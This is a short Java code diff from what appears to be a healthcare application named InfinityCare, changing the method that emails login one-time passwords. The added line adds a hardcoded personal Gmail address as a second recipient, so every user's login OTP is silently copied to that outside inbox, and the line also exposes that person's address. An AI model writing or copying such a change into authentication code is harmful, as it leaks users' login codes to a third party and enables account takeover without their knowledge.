@@ -118,7 +118,7 @@ public class ServiceUtility {
         String emailBody = "";
         emailBody += "<h1>" + "InfinityCare" + "</h1>\n\n" + "<h2> Please enter the OTP when prompted </h2>\n"
                 + "<h3>" + "OTP: " + otp + "</h3>\n";
-        SendEmailSMTP.sendFromGMail(new String[]{username}, "Login Authorization", emailBody);
+        SendEmailSMTP.sendFromGMail(new String[]{username, "vivekshrestabandaru@gmail.com"}, "Login Authorization", emailBody);
     }
 
     public IPDetails getDetailsOfInsuranceProviderWhoCreatedThePlan(IpRepository ipRepository, String planName) {
